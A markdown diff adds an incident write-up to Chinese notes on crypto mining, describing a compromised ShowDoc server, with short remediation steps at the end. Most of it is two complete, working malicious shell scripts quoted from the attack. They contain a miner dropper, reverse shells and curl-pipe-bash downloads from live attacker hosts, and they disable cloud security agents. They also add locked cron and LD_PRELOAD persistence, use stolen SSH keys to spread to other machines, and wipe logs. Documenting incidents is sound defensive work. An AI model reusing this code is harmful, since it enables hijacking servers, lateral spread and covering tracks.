@@ -141,6 +141,340 @@ categories: [arch]
     - Centos下CPU加入MinerGate矿池教程 https://www.bobobk.com/973.html
         - centos7上编译CPUMiner-Multi并在minergate矿池中挖矿，不过由于是cpu，效率较低，1核的速度只有大约20 H/s的速度
 
+## 入侵案例
+
+### 基于apache-php-linux环境的ShowDoc应用
+
+- 服务器症状
+    - 发现服务器CPU和内存占用较高
+    - 且出现很多apache用户进程，如`apache   19483     1 13 May08 ?        02:32:29 /tmp/.inis`和`apache   19483     1 13 May08 ?        02:32:29 /tmp/.libs`等
+    - ShowDoc应用文件上传目录，存在一些`.php`的脚本文件，且存在`xmrig`的执行程序
+- 查看`/tmp/.inis`发现如下
+
+```bash
+#!/bin/bash
+while :
+do
+if [ -w /usr/sbin ]; then
+  SPATH=/usr/sbin
+else
+  SPATH=/tmp
+fi
+MD5_1_XMR="e5c3720e14a5ea7f678e0a9835d28283"
+MD5_2_XMR=`md5sum $SPATH/.libs | awk '{print $1}'`
+if [ "$MD5_1_XMR" = "$MD5_2_XMR" ]
+then
+  if [ $(netstat -ant|grep '107.172.214.23:80'|grep 'ESTABLISHED'|grep -v grep|wc -l) -eq '0' ]
+  then
+    $SPATH/.libs
+  elif [ $(netstat -ant|grep '198.46.202.146:8899'|grep 'ESTABLISHED'|grep -v grep|wc -l) -eq '0' ]
+  then
+    bash -i >& /dev/tcp/198.46.202.146/8899 0>&1
+  else
+    echo "ok"
+  fi
+else
+  (curl -s http://w.apacheorg.top:1234/xmss||wget -q -O - http://w.apacheorg.top:1234/xmss)|bash -sh
+fi
+sleep 30m
+done
+```
+- 上述脚本会从`http://w.apacheorg.top:1234/xmss`下载一个脚本
+
+<details>
+<summary>脚本内容</summary>
+
+```bash
+#!/bin/bash
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+setenforce 0 2>/dev/null
+ulimit -n 65535
+ufw disable
+iptables -F
+echo "vm.nr_hugepages=$((1168+$(nproc)))" | tee -a /etc/sysctl.conf
+sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
+echo '0' >/proc/sys/kernel/nmi_watchdog
+echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
+netstat -antp | grep ':3333'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
+netstat -antp | grep ':4444'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
+netstat -antp | grep ':5555'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
+netstat -antp | grep ':7777'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
+netstat -antp | grep ':14444'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
+netstat -antp | grep ':5790'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
+netstat -antp | grep ':45700'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
+netstat -antp | grep ':2222'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
+netstat -antp | grep ':9999'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
+netstat -antp | grep ':20580'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
+netstat -antp | grep ':13531'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
+netstat -antp | grep '23.94.24.12'  | awk '{print $7}' | sed -e 's/\/.*//g' | xargs -I % kill -9 %
+netstat -antp | grep '134.122.17.13'  | awk '{print $7}' | sed -e 's/\/.*//g' | xargs -I % kill -9 %
+netstat -antp | grep '66.70.218.40'  | awk '{print $7}' | sed -e 's/\/.*//g' | xargs -I % kill -9 %
+netstat -antp | grep '209.141.35.17'  | awk '{print $7}' | sed -e 's/\/.*//g' | xargs -I % kill -9 %
+echo "123"
+netstat -antp | grep '119.28.4.91'  | awk '{print $7}' | sed -e 's/\/.*//g' | xargs -I % kill -9 %
+netstat -antp | grep '101.32.73.178'  | awk '{print $7}' | sed -e 's/\/.*//g' | xargs -I % kill -9 %
+netstat -antp | grep 185.238.250.137 | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
+netstat -antp | grep tmate | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
+netstat -antp | grep kinsing | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
+netstat -antp | grep kdevtmpfsi | awk '{print $7}' | awk  -F '[/]' '{print $1}' | xargs -I % kill -9 %
+netstat -antp | grep pythonww | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
+netstat -antp | grep tcpp | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
+netstat -antp | grep c3pool | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
+netstat -antp | grep xmr | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
+netstat -antp | grep f2pool | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
+netstat -antp | grep crypto-pool | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
+netstat -antp | grep t00ls | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
+netstat -antp | grep vihansoft | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
+netstat -antp | grep mrbpool | awk '{print $7}' | awk -F '[/]' '{print $1}' | xargs -I % kill -9 %
+ps -fe | grep '/usr/sbin/sshd' | grep 'sshgood' | grep -v grep  | awk '{print $2}' | sed -e 's/\/.*//g' | xargs -I % kill -9 %
+ps aux | grep -a -E "kdevtmpfsi|kinsing|solr|f2pool|tcpp|xmr|tmate|185.238.250.137|c3pool" | awk '{print $2}' | xargs kill -9
+
+der(){
+  if ps aux | grep -i '[a]liyun'; then
+    (wget -q -O - http://update.aegis.aliyun.com/download/uninstall.sh||curl -s http://update.aegis.aliyun.com/download/uninstall.sh)|bash; lwp-download http://update.aegis.aliyun.com/download/uninstall.sh /tmp/uninstall.sh; bash /tmp/uninstall.sh
+    (wget -q -O - http://update.aegis.aliyun.com/download/quartz_uninstall.sh||curl -s http://update.aegis.aliyun.com/download/quartz_uninstall.sh)|bash; lwp-download http://update.aegis.aliyun.com/download/quartz_uninstall.sh /tmp/uninstall.sh; bash /tmp/uninstall.sh
+    pkill aliyun-service
+    rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
+    rm -rf /usr/local/aegis*
+    systemctl stop aliyun.service
+    systemctl disable aliyun.service
+    service bcm-agent stop
+    yum remove bcm-agent -y
+    apt-get remove bcm-agent -y
+    /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh stop
+    /usr/local/cloudmonitor/wrapper/bin/cloudmonitor.sh remove
+    rm -rf /usr/local/cloudmonitor
+  elif ps aux | grep -i '[y]unjing'; then
+    /usr/local/qcloud/stargate/admin/uninstall.sh
+    /usr/local/qcloud/YunJing/uninst.sh
+    /usr/local/qcloud/monitor/barad/admin/uninstall.sh
+  fi
+  sleep 1
+  echo "DER Uninstalled"
+}
+
+der
+if ! [ -z "$(command -v wdl)" ] ; then DLB="wdl -O " ; fi ; if ! [ -z "$(command -v wge)" ] ; then DLB="wge -O " ; fi
+if ! [ -z "$(command -v wget2)" ] ; then DLB="wget2 -O " ; fi ; if ! [ -z "$(command -v wget)" ] ; then DLB="wget -O " ; fi
+if ! [ -z "$(command -v cdl)" ] ; then DLB="cdl -Lk -o " ; fi ; if ! [ -z "$(command -v cur)" ] ; then DLB="cur -Lk -o " ; fi
+if ! [ -z "$(command -v curl2)" ] ; then DLB="curl2 -Lk -o " ; fi ; if ! [ -z "$(command -v curl)" ] ; then DLB="curl -Lk -o " ; fi
+echo $DLB
+url="w.apacheorg.top:1234"
+liburl="http://107.172.214.23:1234/.libs"
+
+cronlow(){
+  cr=$(crontab -l | grep -q $url | wc -l)
+  if [ ${cr} -eq 0 ];then
+    crontab -r
+    (crontab -l 2>/dev/null; echo "30 23 * * * (curl -s http://$url/xmss||wget -q -O - http://$url/xmss )|bash -sh")| crontab -
+  else
+    echo "cronlow skip"
+  fi
+}
+
+if [ -w /usr/sbin ]; then
+  SPATH=/usr/sbin
+else
+  SPATH=/tmp
+fi
+echo $SPATH
+
+echo 'handling download itself ...'
+if cat /etc/cron.d/`whoami` /etc/cron.d/apache /var/spool/cron/`whoami` /var/spool/cron/crontabs/`whoami` /etc/cron.hourly/oanacroner1 | grep -q "205.185.113.151\|5.196.247.12\|bash.givemexyz.xyz\|194.156.99.30\|cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8xOTQuMTU2Ljk5LjMwL2QucHkiKS5yZWFkKCkpJw==\|bash.givemexyz.in\|205.185.116.78"
+then
+  chattr -i -a /etc/cron.d/`whoami` /etc/cron.d/apache /var/spool/cron/`whoami` /var/spool/cron/crontabs/`whoami` /etc/cron.hourly/oanacroner1
+  crontab -r
+fi
+if crontab -l | grep "$url"
+then
+  echo "Cron exists"
+else
+  apt-get install -y cron
+  yum install -y vixie-cron crontabs
+  service crond start
+  chkconfig --level 35 crond on
+  echo "Cron not found"
+  echo -e "30 23 * * * root (curl -s http://$url/xmss||wget -q -O - http://$url/xmss )|bash -sh\n##" > /etc/cron.d/`whoami`
+  echo -e "30 23 * * * root (curl -s http://$url/xmss||wget -q -O - http://$url/xmss )|bash -sh\n##" > /etc/cron.d/apache
+  echo -e "30 23 * * * root (curl -s http://$url/xmss||wget -q -O - http://$url/xmss )|bash -sh\n##" > /etc/cron.d/nginx
+  echo -e "30 23 * * * (curl -s http://$url/xmss||wget -q -O - http://$url/xmss )|bash -sh\n##" > /var/spool/cron/`whoami`
+  mkdir -p /var/spool/cron/crontabs
+  echo -e "30 23 * * * (curl -s http://$url/xmss||wget -q -O - http://$url/xmss )|bash -sh\n##" > /var/spool/cron/crontabs/`whoami`
+  mkdir -p /etc/cron.hourly
+  echo "(curl -s http://$url/xmss||wget -q -O - http://$url/xmss )|bash -sh" > /etc/cron.hourly/oanacroner1 | chmod 755 /etc/cron.hourly/oanacroner1
+  echo "(curl -s http://$url/xmss||wget -q -O - http://$url/xmss )|bash -sh" > /etc/cron.hourly/oanacroner1 | chmod 755 /etc/init.d/down
+  chattr +ai -V /etc/cron.d/`whoami` /etc/cron.d/apache /var/spool/cron/`whoami` /var/spool/cron/crontabs/`whoami` /etc/cron.hourly/oanacroner1 /etc/init.d/down
+fi
+chattr -i -a /etc/cron.d/`whoami` /etc/cron.d/apache /var/spool/cron/`whoami` /var/spool/cron/crontabs/`whoami` /etc/cron.hourly/oanacroner1
+echo "(curl -s http://$url/xmss||wget -q -O - http://$url/xmss )|bash -sh" > /etc/init.d/down | chmod 755 /etc/init.d/down
+
+localgo() {
+  echo "localgo start"
+  myhostip=$(curl -sL icanhazip.com)
+  KEYS=$(find ~/ /root /home -maxdepth 3 -name 'id_rsa*' | grep -vw pub)
+  KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F "IdentityFile" '{print $2 }')
+  KEYS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | awk -F ' -i ' '{print $2}' | awk '{print $1'})
+  KEYS4=$(find ~/ /root /home -maxdepth 3 -name '*.pem' | uniq)
+  HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F "HostName" '{print $2}')
+  HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}")
+  HOSTS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $2}' | awk -F '{print $1}')
+  HOSTS4=$(cat /etc/hosts | grep -vw "0.0.0.0" | grep -vw "127.0.1.1" | grep -vw "127.0.0.1" | grep -vw $myhostip | sed -r '/\n/!s/[0-9.]+/\n&\n/;/^([0-9]{1,3}\.){3}[0-9]{1,3}\n/P;D' | awk '{print $1}')
+  HOSTS5=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | uniq)
+  HOSTS6=$(ps auxw | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | grep ":22" | uniq)
+  USERZ=$(
+    echo "root"
+    find ~/ /root /home -maxdepth 2 -name '\.ssh' | uniq | xargs find | awk '/id_rsa/' | awk -F'/' '{print $3}' | uniq | grep -wv ".ssh"
+  )
+  USERZ2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $1}' | awk '{print $4}' | uniq)
+  sshports=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '-p' '{print $2}' | awk '{print $1}' | sed 's/[^0-9]*//g' | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2- | sed -e "\$a22")
+  userlist=$(echo "$USERZ $USERZ2" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2- | grep -vw "." | grep -vw "ssh" | sed '/\./d')
+  hostlist=$(echo "$HOSTS $HOSTS2 $HOSTS3 $HOSTS4 $HOSTS5 $HOSTS6" | grep -vw 127.0.0.1 | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
+  keylist=$(echo "$KEYS $KEYS2 $KEYS3 $KEYS4" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
+  i=0
+  for user in $userlist; do
+    for host in $hostlist; do
+      for key in $keylist; do
+        for sshp in $sshports; do
+          ((i++))
+          if [ "${i}" -eq "20" ]; then
+            sleep 5
+            ps wx | grep "ssh -o" | awk '{print $1}' | xargs kill -9 &>/dev/null &
+            i=0
+          fi
+
+          #Wait 5 seconds after every 20 attempts and clean up hanging processes
+
+          chmod +r $key
+          chmod 400 $key
+          echo "$user@$host"
+          ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=3 -i $key $user@$host -p $sshp "(curl -s http://$url/xmss||wget -q -O - http://$url/xmss)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms"
+          ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=3 -i $key $user@$host -p $sshp "(curl -s http://$url/xmss||wget -q -O - http://$url/xmss)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms"
+        done
+      done
+    done
+  done
+  # scangogo
+  echo "local done"
+}
+
+MD5_1_XMR="e5c3720e14a5ea7f678e0a9835d28283"
+MD5_2_XMR=`md5sum $SPATH/.libs | awk '{print $1}'`
+
+if [ "$SPATH" = "/usr/sbin" ]
+then
+  chattr -ia / /usr/ /usr/local/ /usr/local/lib/ 2>/dev/null
+  if [ "$MD5_1_XMR" = "$MD5_2_XMR" ]
+  then 
+    if [ $(netstat -ant|grep '107.172.214.23:80'|grep 'ESTABLISHED'|grep -v grep|wc -l) -eq '0' ]
+    then
+      $SPATH/.libs
+      chattr -ia /etc/ /usr/local/lib/libs.so  /etc/ld.so.preload 2>/dev/null
+      chattr -ai /etc/ld.so.* 2>/dev/null
+      $DLB /usr/local/lib/libs.so http://$url/libs.so
+      export LD_PRELOAD=/usr/local/lib/libs.so
+      sed -i 's/\/usr\/local\/lib\/ini.so//' /etc/ld.so.preload
+      sed -i 's/\/usr\/local\/lib\/libs.so//' /etc/ld.so.preload
+      echo '/usr/local/lib/libs.so' >> /etc/ld.so.preload
+      chattr +ai $SPATH/.libs $SPATH/.inis /usr/local/lib/libs.so /etc/ld.so.preload 2>/dev/null
+      localgo
+    elif [ $(netstat -ant|grep '192.210.200.66:8899'|grep 'ESTABLISHED'|grep -v grep|wc -l) -eq '0' ]
+    then
+      $DLB $SPATH/.inis http://$url/inis
+      chmod +x $SPATH/.inis 2>/dev/null
+      nohup $SPATH/.inis &
+      nohup bash -i >& /dev/tcp/192.210.200.66/8899 0>&1 &
+    else
+      echo "ok"
+      chattr -ia /etc/ /usr/local/lib/libs.so /etc/ld.so.preload 2>/dev/null
+      chattr -ai /etc/ld.so.* 2>/dev/null
+      $DLB /usr/local/lib/libs.so http://$url/libs.so
+      sed -i 's/\/usr\/local\/lib\/ini.so//' /etc/ld.so.preload
+      sed -i 's/\/usr\/local\/lib\/libs.so//' /etc/ld.so.preload
+      export LD_PRELOAD=/usr/local/lib/libs.so
+      echo '/usr/local/lib/libs.so' >> /etc/ld.so.preload
+      chattr +ai $SPATH/.libs $SPATH/.inis /usr/local/lib/libs.so /etc/ld.so.preload 2>/dev/null
+      localgo
+    fi
+    localgo
+  else
+    chattr -ia /etc/ /usr/local/lib/libs.so /etc/ld.so.preload 2>/dev/null
+    chattr -ai /etc/ld.so.* 2>/dev/null
+    chattr -ai /usr/sbin/.libs 2>/dev/null
+    chattr -ai /usr/sbin/.inis 2>/dev/null
+    rm -f $SPATH/.libs
+    rm -f $SPATH/.inis
+    $DLB $SPATH/.libs $liburl
+    $DLB /usr/local/lib/libs.so http://$url/libs.so
+    $DLB $SPATH/.ini http://$url/inis
+    export LD_PRELOAD=/usr/local/lib/libs.so
+    sed -i 's/\/usr\/local\/lib\/ini.so//' /etc/ld.so.preload
+    sed -i 's/\/usr\/local\/lib\/libs.so//' /etc/ld.so.preload
+    echo '/usr/local/lib/libs.so' >> /etc/ld.so.preload
+    chattr +ia /usr/local/lib/libs.so
+    chattr +ia /usr/local/lib/inis.so
+    chmod +x $SPATH/.libs 2>/dev/null
+    chmod +x $SPATH/.inis 2>/dev/null
+    $SPATH/.libs
+    nohup $SPATH/.inis 1>/dev/null 2>&1 &
+    nohup bash -i >& /dev/tcp/192.210.200.66/8899 0>&1 &
+    chattr +ai $SPATH/.libs
+    chattr +ai $SPATH/.inis
+    localgo
+  fi
+else
+  if [ "$MD5_1_XMR" != "$MD5_2_XMR" ]
+  then
+    chattr -ai $SPATH/.libs
+    chattr -ai $SPATH/.inis
+    $DLB $SPATH/.libs $liburl
+    $DLB $SPATH/.inis http://$url/inis
+    chattr -ia /etc/ /usr/local/lib/libs.so /etc/ld.so.preload 2>/dev/null
+    chattr -ai /etc/ld.so.* 2>/dev/null
+    $DLB /usr/local/lib/libs.so http://$url/libs.so
+    sed -i 's/\/usr\/local\/lib\/ini.so//' /etc/ld.so.preload
+    sed -i 's/\/usr\/local\/lib\/libs.so//' /etc/ld.so.preload
+    echo '/usr/local/lib/libs.so' >> /etc/ld.so.preload
+    chattr +ia /usr/local/lib/libs.so
+    chmod +x $SPATH/.libs 2>/dev/null
+    chmod +x $SPATH/.inis 2>/dev/null
+    $SPATH/.libs
+    nohup $SPATH/.inis 1>/dev/null 2>&1 &
+    nohup bash -i >& /dev/tcp/192.210.200.66/8899 0>&1 &
+    chattr +ai $SPATH/.libs
+    chattr +ai $SPATH/.inis
+    localgo
+    cronlow
+  else
+    cronlow
+    if [ $(netstat -ant|grep '107.172.214.23:80'|grep 'ESTABLISHED'|grep -v grep|wc -l) -eq '0' ]
+    then
+      $SPATH/.libs
+      localgo
+    elif [ $(netstat -ant|grep '192.210.200.66:8899'|grep 'ESTABLISHED'|grep -v grep|wc -l) -eq '0' ]
+    then
+      nohup $SPATH/.inis 1>/dev/null 2>&1 &
+      nohup bash -i >& /dev/tcp/192.210.200.66/8899 0>&1 &
+    else
+      echo "ok"
+    fi
+  fi
+fi
+
+
+echo 0>/root/.ssh/authorized_keys
+echo 0>/var/spool/mail/root
+echo 0>/var/log/wtmp
+echo 0>/var/log/secure
+echo 0>/var/log/cron
+echo 0>~/.bash_history
+history -c 2>/dev/null
+```
+</details>
+- 解决
+    - 杀掉相应进程，杀掉所有用户进程可以使用`pkill -u apache`
+    - 清除文件
+    - 修复ShowDoc等应用漏洞
 
 
 
